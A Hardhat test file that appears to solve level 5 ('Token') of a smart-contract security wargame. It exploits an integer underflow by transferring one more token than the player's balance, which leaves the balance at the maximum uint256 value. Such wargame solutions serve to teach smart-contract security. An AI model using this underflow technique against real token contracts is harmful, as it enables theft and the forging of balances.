import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import hre from "hardhat";

import { Token, TokenFactory, TokenFactory__factory, Token__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("5. Token", function () {
  let context: FixtureContext;
  let level: FixtureLevel<TokenFactory, Token>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, TokenFactory__factory, (address, signer) =>
      Token__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully", async function () {
    const balance = await level.instance.balanceOf(context.player);
    expect(balance).to.be.greaterThan(0);

    const tx = await level.instance.transfer(hre.ethers.ZeroAddress, balance + 1n);
    await expect(tx).to.be.not.reverted;

    expect(await level.instance.balanceOf(context.player)).to.be.eq(hre.ethers.MaxUint256);

    await completeLevel(context, level);
  });
});
